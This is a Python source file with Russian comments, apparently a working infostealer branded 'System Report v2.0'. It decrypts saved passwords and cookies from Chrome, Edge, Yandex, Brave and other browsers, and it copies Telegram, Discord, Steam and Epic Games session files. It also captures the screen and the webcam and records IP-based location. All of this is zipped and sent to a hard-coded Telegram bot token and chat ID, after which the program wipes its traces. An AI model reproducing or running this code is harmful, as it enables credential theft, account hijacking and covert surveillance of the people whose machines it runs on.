import platform
import socket
import psutil
import os
import json
import sqlite3
import telebot
import tempfile
import zipfile
import random
import time
import subprocess
import ctypes
import ctypes.wintypes
from datetime import datetime
from urllib.request import urlopen
from PIL import ImageGrab
import shutil
import base64
import re
import cv2
import sys
import traceback
from pathlib import Path
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

# =============================================
# АВТОМАТИЧЕСКАЯ УСТАНОВКА ЗАВИСИМОСТЕЙ
# =============================================
def install_dependencies():
    """Устанавливает необходимые зависимости"""
    required_packages = [
        'pycryptodomex',
        'opencv-python',
        'pillow',
        'psutil',
        'python-telegram-bot',
        'pypiwin32; platform_system == "Windows"'
    ]
    
    try:
        from Cryptodome.Cipher import AES
        return
    except ImportError:
        print("Установка необходимых библиотек...")
        try:
            for package in required_packages:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print("Библиотеки успешно установлены!")
        except Exception as e:
            print(f"Ошибка установки библиотек: {e}")
            sys.exit(1)

install_dependencies()

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
TELEGRAM_CHAT_ID = "1962231620"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Пути для хранения данных
if platform.system() == "Linux":
    BASE_DIR = Path.home() / ".system_report_data"
    BROWSER_DATA_DIR = Path.home() / ".config"
else:
    BASE_DIR = Path(os.getenv("APPDATA")) / "System_ReportData"
    BROWSER_DATA_DIR = Path(os.getenv("LOCALAPPDATA"))

OTHER_DIR = BASE_DIR / "other"
COOKIE_DIR = OTHER_DIR / "cookies"
PASSWORDS_DIR = OTHER_DIR / "passwords"
SCREENSHOT_PATH = BASE_DIR / "screenshot.jpg"
WEBCAM_PATH = BASE_DIR / "webcam.jpg"
LOCK_FILE = Path(tempfile.gettempdir()) / "system_report.lock"
DEBUG_LOG = BASE_DIR / "debug.log"

# Поддерживаемые браузеры
BROWSERS = {
    "chrome": "Google Chrome",
    "firefox": "Mozilla Firefox",
    "yandex": "Yandex Browser",
    "opera": "Opera Browser",
    "amigo": "Amigo Browser",
    "edge": "Microsoft Edge",
    "brave": "Brave Browser",
    "vivaldi": "Vivaldi Browser",
    "chromium": "Chromium Browser"
}

def debug_log(message):
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"Ошибка записи в лог: {e}")

# =============================================
# ИСПРАВЛЕННАЯ ФУНКЦИЯ ДЛЯ РАБОТЫ С COOKIES
# =============================================
def get_encryption_key(profile_path):
    debug_log(f"Поиск ключа для: {profile_path}")
    
    if platform.system() != "Windows":
        return None
    
    possible_paths = [
        Path(profile_path) / "Local State",
        Path(profile_path).parent / "Local State",
        Path(profile_path).parent.parent / "Local State",
        Path(profile_path).parent.parent.parent / "Local State",
        Path(profile_path).parent.parent.parent.parent / "Local State"
    ]
    
    local_state_path = None
    for path in possible_paths:
        if path.exists():
            local_state_path = path
            break
    
    if not local_state_path:
        return None
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        
        if "os_crypt" not in local_state:
            return None
            
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]
        
        try:
            key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except:
            return None
    except:
        return None

def decrypt_chromium_value(encrypted_value, key):
    try:
        if not encrypted_value or not isinstance(encrypted_value, bytes) or len(encrypted_value) < 3:
            return "DECRYPTION_FAILED"
        
        # Формат v10/v11 (AES-GCM)
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            try:
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                
                try:
                    return plaintext.decode('utf-8')
                except:
                    return plaintext.decode('latin-1', errors='ignore')
            except:
                return "GCM_DECRYPTION_FAILED"
        
        # Старый формат AES-CBC
        elif len(encrypted_value) > 15:
            try:
                iv = encrypted_value[:16]  # Исправлено: первые 16 байт - IV
                ciphertext = encrypted_value[16:]
                
                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
                plaintext = cipher.decrypt(ciphertext)
                padding_length = plaintext[-1]
                plaintext = plaintext[:-padding_length]
                
                try:
                    return plaintext.decode('utf-8')
                except:
                    return plaintext.decode('latin-1', errors='ignore')
            except:
                return "CBC_DECRYPTION_FAILED"
        
        # Прямое расшифрование
        try:
            decrypted = CryptUnprotectData(encrypted_value)
            if decrypted:
                return decrypted[1].decode('utf-8')
            return "DIRECT_DECRYPT_FAILED"
        except:
            return "DIRECT_DECRYPT_FAILED"
            
    except:
        return "DECRYPTION_ERROR"

def chromiumc():
    textchc = '\nSimple ******* by Lizard\n\nChromium Cookies:\nURL | COOKIE | COOKIE NAME\n'
    
    cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), 'Chromium', 'User Data', 'Default', 'Cookies')
    if not os.path.exists(cookies_path):
        return textchc
    
    try:
        profile_path = os.path.join(os.getenv("LOCALAPPDATA"), 'Chromium', 'User Data')
        key = get_encryption_key(profile_path)
        if not key:
            return textchc
        
        temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookies_{random.randint(1000,9999)}.db")
        shutil.copy2(cookies_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        for result in cursor.fetchall():
            try:
                host = result[0]
                name = result[1]
                encrypted_value = result[2]
                
                cookie_value = decrypt_chromium_value(encrypted_value, key) if encrypted_value else "NO_VALUE"
                
                if isinstance(host, bytes):
                    host = host.decode('utf-8', errors='replace')
                if isinstance(name, bytes):
                    name = name.decode('utf-8', errors='replace')
                
                textchc += f"{host} | {cookie_value} | {name}\n"
            except:
                continue
                
    except:
        pass
    finally:
        try:
            conn.close()
            os.remove(temp_db)
        except:
            pass
    
    return textchc

# =============================================
# ВОССТАНОВЛЕННЫЕ ФУНКЦИИ
# =============================================
def create_directories():
    try:
        BASE_DIR.mkdir(parents=True, exist_ok=True)
        OTHER_DIR.mkdir(parents=True, exist_ok=True)
        COOKIE_DIR.mkdir(parents=True, exist_ok=True)
        PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
        DEBUG_LOG.touch(exist_ok=True)
    except Exception as e:
        try:
            os.makedirs(COOKIE_DIR, exist_ok=True)
            os.makedirs(PASSWORDS_DIR, exist_ok=True)
            DEBUG_LOG.touch(exist_ok=True)
        except:
            pass

def get_cpu_name():
    try:
        if platform.system() == "Windows":
            try:
                reg_key = ctypes.windll.advapi32.RegOpenKeyExW(0x80000002, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0", 0, 0x20019)
                buf_size = ctypes.wintypes.DWORD(1024)
                buf = ctypes.create_unicode_buffer(buf_size.value)
                ctypes.windll.advapi32.RegQueryValueExW(reg_key, "ProcessorNameString", None, None, ctypes.byref(buf), ctypes.byref(buf_size))
                ctypes.windll.advapi32.RegCloseKey(reg_key)
                cpu_name = buf.value.strip()
                cpu_name = re.sub(r'\([^)]*\)', '', cpu_name)
                cpu_name = re.sub(r'\s+', ' ', cpu_name).strip()
                if 'GHz' not in cpu_name and 'MHz' not in cpu_name:
                    freq = psutil.cpu_freq().current / 1000 if psutil.cpu_freq() else None
                    if freq:
                        cpu_name += f" {freq:.2f}GHz"
                return cpu_name
            except:
                pass
        else:
            try:
                with open('/proc/cpuinfo') as f:
                    for line in f:
                        if 'model name' in line:
                            return line.split(':')[1].strip()
            except:
                return platform.processor() or "Unknown CPU"
    except:
        pass
    return "Unknown CPU"

def stealthy_kill_browser(browser_name):
    if platform.system() != "Windows":
        return False

    process_map = {
        "chrome": "chrome.exe",
        "firefox": "firefox.exe",
        "opera": "opera.exe",
        "yandex": "browser.exe",
        "amigo": "browser.exe",
        "edge": "msedge.exe",
        "brave": "brave.exe",
        "vivaldi": "vivaldi.exe",
        "chromium": "chrome.exe"
    }
    
    target_process = process_map.get(browser_name)
    if not target_process:
        return False
    
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == target_process.lower():
                try:
                    hwnd = ctypes.windll.user32.FindWindowW(None, f"{BROWSERS[browser_name]}") 
                    if hwnd != 0:
                        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
                    time.sleep(2)
                    if proc.is_running():
                        proc.terminate()
                except:
                    pass
        return True
    except:
        return False

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return False
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(str(WEBCAM_PATH), frame)
            return True
    except:
        return False

def steal_steam_data():
    steam_dir = OTHER_DIR / "Steam"
    steam_dir.mkdir(parents=True, exist_ok=True)
    
    steam_paths = []
    if platform.system() == "Windows":
        steam_paths = [
            Path(os.getenv("ProgramFiles(x86)")) / "Steam" / "config",
            Path(os.getenv("APPDATA")) / "Steam",
            Path(os.getenv("LOCALAPPDATA")) / "Steam"
        ]
    else:
        steam_paths = [
            Path.home() / ".steam",
            Path.home() / ".local" / "share" / "Steam"
        ]
    
    stolen_data = []
    for path in steam_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("vdf", "ssfn", "config")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = steam_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except:
                pass
    
    if stolen_data:
        with open(steam_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_epic_games_data():
    epic_dir = OTHER_DIR / "EpicGames"
    epic_dir.mkdir(parents=True, exist_ok=True)
    
    epic_paths = []
    if platform.system() == "Windows":
        epic_paths = [
            Path(os.getenv("LOCALAPPDATA")) / "EpicGamesLauncher" / "Saved",
            Path(os.getenv("APPDATA")) / "Epic"
        ]
    else:
        epic_paths = [
            Path.home() / ".config" / "Epic",
            Path.home() / ".local" / "share" / "Epic"
        ]
    
    stolen_data = []
    for path in epic_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("ini", "dat", "log", "json")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = epic_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except:
                pass
    
    if stolen_data:
        with open(epic_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_telegram_data():
    telegram_dir = OTHER_DIR / "Telegram"
    telegram_dir.mkdir(parents=True, exist_ok=True)
    
    telegram_paths = []
    if platform.system() == "Windows":
        telegram_paths = [
            Path(os.getenv("APPDATA")) / "Telegram Desktop" / "tdata",
            Path(os.getenv("LOCALAPPDATA")) / "Telegram Desktop"
        ]
    else:
        telegram_paths = [
            Path.home() / ".local" / "share" / "TelegramDesktop",
            Path.home() / ".TelegramDesktop"
        ]
    
    stolen_data = []
    for path in telegram_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("map", "s", "key")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = telegram_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except:
                pass
    
    if stolen_data:
        with open(telegram_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_discord_data():
    discord_dir = OTHER_DIR / "Discord"
    discord_dir.mkdir(parents=True, exist_ok=True)
    
    discord_paths = []
    if platform.system() == "Windows":
        discord_paths = [
            Path(os.getenv("APPDATA")) / "discord" / "Local Storage" / "leveldb",
            Path(os.getenv("LOCALAPPDATA")) / "Discord"
        ]
    else:
        discord_paths = [
            Path.home() / ".config" / "discord",
            Path.home() / ".config" / "discordptb",
            Path.home() / ".config" / "discordcanary"
        ]
    
    stolen_data = []
    for path in discord_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith((".ldb", ".log", ".manifest", ".json")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = discord_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except:
                pass
    
    if stolen_data:
        with open(discord_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_chrome_passwords(browser_name, profile_path):
    try:
        key = get_encryption_key(str(Path(profile_path).parent))
        login_db = os.path.join(profile_path, "Login Data")
        
        if not os.path.exists(login_db):
            return []
        
        temp_db = os.path.join(tempfile.gettempdir(), f"temp_pass_{browser_name}_{random.randint(1000,9999)}.db")
        shutil.copy2(login_db, temp_db)
        
        passwords = []
        try:
            conn = sqlite3.connect(temp_db)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for item in cursor.fetchall():
                try:
                    url, username, password_value = item
                    decrypted_pass = decrypt_chromium_value(password_value, key)
                    
                    passwords.append({
                        'url': url.decode('utf-8', errors='ignore') if isinstance(url, bytes) else url,
                        'username': username.decode('utf-8', errors='ignore') if isinstance(username, bytes) else username,
                        'password': decrypted_pass
                    })
                except:
                    continue
        except:
            pass
        finally:
            try:
                conn.close()
                os.remove(temp_db)
            except:
                pass
        
        return passwords
    except:
        return []

def steal_passwords():
    try:
        if not PASSWORDS_DIR.exists():
            PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
        
        appdata = BROWSER_DATA_DIR
        roaming = Path(os.getenv("APPDATA"))
        
        browser_paths = {
            "chrome": appdata / "Google" / "Chrome" / "User Data" / "Default",
            "edge": appdata / "Microsoft" / "Edge" / "User Data" / "Default",
            "opera": roaming / "Opera Software" / "Opera Stable",
            "yandex": appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default",
            "amigo": appdata / "Amigo" / "User Data" / "Default",
            "brave": appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
            "vivaldi": appdata / "Vivaldi" / "User Data" / "Default",
            "chromium": appdata / "Chromium" / "User Data" / "Default"
        }
        
        for browser_name, display_name in BROWSERS.items():
            try:
                passwords = []
                
                if browser_name == "firefox":
                    pass
                elif browser_name in browser_paths:
                    path = browser_paths[browser_name]
                    if path.exists():
                        if platform.system() == "Windows":
                            stealthy_kill_browser(browser_name)
                            time.sleep(1)
                        passwords = steal_chrome_passwords(browser_name, str(path))
                
                if passwords:
                    password_file = PASSWORDS_DIR / f"{display_name}_Passwords.json"
                    with open(password_file, 'w', encoding='utf-8') as f:
                        json.dump(passwords, f, indent=4, ensure_ascii=False)
                        
            except:
                pass
    except:
        pass

def steal_cookies():
    try:
        if not COOKIE_DIR.exists():
            COOKIE_DIR.mkdir(parents=True, exist_ok=True)
        
        appdata = BROWSER_DATA_DIR
        roaming = Path(os.getenv("APPDATA"))
        
        browser_paths = {
            "chrome": appdata / "Google" / "Chrome" / "User Data" / "Default",
            "edge": appdata / "Microsoft" / "Edge" / "User Data" / "Default",
            "opera": roaming / "Opera Software" / "Opera Stable",
            "yandex": appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default",
            "amigo": appdata / "Amigo" / "User Data" / "Default",
            "brave": appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
            "vivaldi": appdata / "Vivaldi" / "User Data" / "Default",
            "chromium": appdata / "Chromium" / "User Data" / "Default"
        }
        
        for browser_name, display_name in BROWSERS.items():
            try:
                cookies = []
                
                if browser_name == "firefox":
                    cookies = get_firefox_cookies()
                elif browser_name in browser_paths:
                    path = browser_paths[browser_name]
                    if path.exists():
                        if platform.system() == "Windows":
                            stealthy_kill_browser(browser_name)
                            time.sleep(1)
                        cookies = steal_chromium_cookies(browser_name, str(path))
                
                if cookies:
                    cookie_file = COOKIE_DIR / f"{display_name}_Cookies.json"
                    with open(cookie_file, 'w', encoding='utf-8') as f:
                        json.dump(cookies, f, indent=4, ensure_ascii=False)
                        
            except:
                pass
        
        try:
            cookies_text = chromiumc()
            if cookies_text:
                txt_path = COOKIE_DIR / "chromium_cookies.txt"
                with open(txt_path, "w", encoding="utf-8") as f:
                    f.write(cookies_text)
        except:
            pass
            
    except:
        pass

def get_firefox_cookies():
    profiles = get_firefox_profiles()
    all_cookies = []
    
    for profile in profiles:
        if not profile or not isinstance(profile, str):
            continue
            
        db_path = Path(profile) / 'cookies.sqlite'
        if not db_path.exists():
            continue
            
        try:
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()
            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
                FROM moz_cookies
            """)
            
            for row in cursor:
                try:
                    host, name, value, path, expiry, is_secure, is_http_only, same_site = row
                    
                    host = host if isinstance(host, str) else host.decode('utf-8', errors='ignore')
                    name = name if isinstance(name, str) else name.decode('utf-8', errors='ignore')
                    path = path if isinstance(path, str) else path.decode('utf-8', errors='ignore')
                    
                    if isinstance(value, bytes):
                        value_str = base64.b64encode(value).decode('utf-8')
                    else:
                        value_str = str(value)
                        
                    all_cookies.append({
                        'host': host,
                        'name': name,
                        'value': value_str,
                        'path': path,
                        'expires': expiry,
                        'secure': bool(is_secure),
                        'http_only': bool(is_http_only),
                        'same_site': same_site
                    })
                except:
                    continue
                    
        except:
            pass
        finally:
            conn.close()
            
    return all_cookies

def steal_chromium_cookies(browser_name, profile_path):
    try:
        key = get_encryption_key(str(Path(profile_path).parent))
        cookie_db = os.path.join(profile_path, "Network", "Cookies")
        
        if not os.path.exists(cookie_db):
            return []
        
        temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookie_{browser_name}_{random.randint(1000,9999)}.db")
        shutil.copy2(cookie_db, temp_db)
        
        cookies = []
        try:
            conn = sqlite3.connect(temp_db)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, encrypted_value FROM cookies")
            
            for item in cursor.fetchall():
                try:
                    host, name, value, path, expires, secure, encrypted_value = item
                    
                    if key and encrypted_value and isinstance(encrypted_value, bytes):
                        cookie_value = decrypt_chromium_value(encrypted_value, key)
                    else:
                        if isinstance(value, bytes):
                            cookie_value = value.decode('utf-8', errors='ignore')
                        else:
                            cookie_value = value
                    
                    cookies.append({
                        'host': host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else host,
                        'name': name.decode('utf-8', errors='ignore') if isinstance(name, bytes) else name,
                        'value': cookie_value,
                        'path': path.decode('utf-8', errors='ignore') if isinstance(path, bytes) else path,
                        'expires': expires,
                        'secure': bool(secure)
                    })
                except:
                    continue
        except:
            pass
        finally:
            try:
                conn.close()
                os.remove(temp_db)
            except:
                pass
        
        return cookies
    except:
        return []

def get_firefox_profiles():
    profiles = []
    appdata = os.getenv('APPDATA')
    if not appdata:
        return profiles
    firefox_path = Path(appdata) / 'Mozilla' / 'Firefox' / 'Profiles'
    if not firefox_path.exists():
        return profiles
    for item in os.listdir(str(firefox_path)):
        full_path = firefox_path / item
        if full_path.is_dir():
            profiles.append(str(full_path))
    return profiles

def get_ipinfo():
    try:
        response = urlopen('http://ipinfo.io/json')
        return json.load(response)
    except:
        return {"ip": "N/A", "org": "N/A", "city": "N/A", "region": "N/A", "country": "N/A"}

def get_system_info():
    ipinfo = get_ipinfo()
    
    cpu_info = {
        "model": get_cpu_name(),
        "physical_cores": psutil.cpu_count(logical=False),
        "logical_cores": psutil.cpu_count(logical=True),
        "max_frequency": psutil.cpu_freq().max if hasattr(psutil, "cpu_freq") and psutil.cpu_freq() else "N/A",
        "usage": psutil.cpu_percent(interval=1)
    }
    
    drives = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            drives.append({
                "device": part.device,
                "mountpoint": part.mountpoint,
                "fstype": part.fstype,
                "total_gb": round(usage.total / (1024**3), 2),
                "used_gb": round(usage.used / (1024**3), 2),
                "free_gb": round(usage.free / (1024**3), 2),
                "percent_used": usage.percent
            })
        except:
            continue
    
    network_info = {
        "public_ip": ipinfo.get("ip", "N/A"),
        "isp": ipinfo.get("org", "N/A"),
        "location": f"{ipinfo.get('city', 'N/A')}, {ipinfo.get('region', 'N/A')}, {ipinfo.get('country', 'N/A')}",
        "connections": []
    }
    
    return {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "system": {
            "os": platform.system(),
            "version": platform.version(),
            "release": platform.release(),
            "architecture": platform.architecture()[0],
            "hostname": socket.gethostname(),
            "username": os.getlogin()
        },
        "hardware": {
            "cpu": cpu_info,
            "memory": {
                "total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
                "available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
                "used_percent": psutil.virtual_memory().percent
            },
            "disks": drives
        },
        "network": network_info,
        "software": {
            "python_version": platform.python_version()
        }
    }

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(str(SCREENSHOT_PATH), "JPEG", quality=90)
        return True
    except:
        return False

def create_zip():
    zip_name = f"system_data_{random.randint(1000,9999)}.zip"
    zip_path = Path(tempfile.gettempdir()) / zip_name
    
    try:
        with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(str(BASE_DIR)):
                for file in files:
                    file_path = Path(root) / file
                    arcname = file_path.relative_to(BASE_DIR)
                    try:
                        zipf.write(str(file_path), str(arcname))
                    except:
                        pass
                
            empty_folders = [
                OTHER_DIR,
                COOKIE_DIR,
                PASSWORDS_DIR,
                OTHER_DIR / "Steam",
                OTHER_DIR / "EpicGames",
                OTHER_DIR / "Telegram",
                OTHER_DIR / "Discord"
            ]
            
            for folder in empty_folders:
                if folder.exists() and folder.is_dir():
                    marker_file = folder / ".keep"
                    try:
                        marker_file.touch(exist_ok=True)
                        arcname = marker_file.relative_to(BASE_DIR)
                        zipf.write(str(marker_file), str(arcname))
                    except:
                        pass
            
        return zip_path
    except:
        return None

def send_to_telegram(zip_path):
    try:
        if SCREENSHOT_PATH.exists():
            with open(str(SCREENSHOT_PATH), 'rb') as photo:
                bot.send_photo(TELEGRAM_CHAT_ID, photo, caption="Скриншот рабочего стола")
            time.sleep(1)

        if WEBCAM_PATH.exists():
            with open(str(WEBCAM_PATH), 'rb') as photo:
                bot.send_photo(TELEGRAM_CHAT_ID, photo, caption="Снимок с веб-камеры")
            time.sleep(1)

        sys_info = get_system_info()
        cpu_name = get_cpu_name()
        cpu_cores = f"{psutil.cpu_count(logical=False)}/{psutil.cpu_count(logical=True)}"
        cpu_usage = f"{psutil.cpu_percent(interval=1)}%"
        
        summary = (
            "СИСТЕМНЫЙ ОТЧЕТ\n"
            f"• ОС: {sys_info['system']['os']} {sys_info['system']['version']}\n"
            f"• Пользователь: {sys_info['system']['username']}\n"
            f"• Процессор: {cpu_name}\n"
            f"• Ядра: {cpu_cores}\n"
            f"• Нагрузка: {cpu_usage}\n"
            f"• ОЗУ: {sys_info['hardware']['memory']['total_gb']} GB\n"
            f"• IP: {sys_info['network']['public_ip']}\n"
            f"• Местоположение: {sys_info['network']['location']}"
        )
        bot.send_message(TELEGRAM_CHAT_ID, summary)
        time.sleep(1)

        if not zip_path or not zip_path.exists():
            bot.send_message(TELEGRAM_CHAT_ID, "Ошибка: архив не создан")
            return False
        
        zip_size = zip_path.stat().st_size / (1024 * 1024)
        if zip_size > 50:
            bot.send_message(TELEGRAM_CHAT_ID, f"Размер архива превышает 50 МБ ({zip_size:.2f} МБ). Данные не будут отправлены.")
            return False

        with open(str(zip_path), 'rb') as f:
            bot.send_document(TELEGRAM_CHAT_ID, f, caption="Полные данные системы", timeout=120)
        return True
    except:
        return False

def cleanup():
    try:
        if BASE_DIR.exists():
            shutil.rmtree(str(BASE_DIR), ignore_errors=True)
        if LOCK_FILE.exists():
            LOCK_FILE.unlink()
        for file in Path(tempfile.gettempdir()).iterdir():
            if file.name.startswith("temp_") and (file.name.endswith(".db") or file.name.endswith(".json")):
                try:
                    file.unlink()
                except:
                    pass
    except:
        pass

def main_workflow():
    try:
        create_directories()
        
        sys_info = get_system_info()
        with open(BASE_DIR / "system_report.json", 'w', encoding='utf-8') as f:
            json.dump(sys_info, f, indent=4, ensure_ascii=False)
        
        steal_cookies()
        steal_passwords()
        steal_telegram_data()
        steal_discord_data()
        steal_steam_data()
        steal_epic_games_data()
        
        take_screenshot()
        capture_webcam()
        
        zip_file = create_zip()
        if zip_file:
            send_to_telegram(zip_file)
    except:
        pass

# ... (весь предыдущий код остается без изменений до самого конца) ...

if __name__ == "__main__":
    # Добавлена диагностика запуска
    print("="*50)
    print(f"Запуск System Report v2.0 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*50)
    
    # Проверка блокировки с диагностикой
    debug_log(f"Проверка lock-файла: {LOCK_FILE}")
    if LOCK_FILE.exists():
        debug_log("Обнаружен lock-файл - завершение работы")
        print("[!] Программа уже запущена. Завершение.")
        sys.exit(0)
    
    try:
        # Создаем lock-файл с PID
        with open(str(LOCK_FILE), 'w') as f:
            f.write(str(os.getpid()))
        debug_log(f"Создан lock-файл с PID: {os.getpid()}")
        
        print("[+] Начало сбора данных...")
        main_workflow()
        debug_log("[+] Основной поток завершен успешно")
        print("[✓] Данные успешно собраны и отправлены!")
        
    except Exception as e:
        debug_log(f"!!! Критическая ошибка в main: {traceback.format_exc()}")
        print(f"[X] Критическая ошибка: {str(e)}")
        try:
            bot.send_message(TELEGRAM_CHAT_ID, f"Критическая ошибка: {str(e)[:1000]}")
        except:
            pass
    finally:
        debug_log("Запуск очистки...")
        cleanup()
        print("[✓] Очистка следов завершена")
    
    # Фиксируем завершение работы
    debug_log("Программа завершена")
    print("="*50)
    print("Программа завершит работу через 60 секунд...")
    print("="*50)
    time.sleep(60)
    
    print("Программа завершена")
    time.sleep(60)
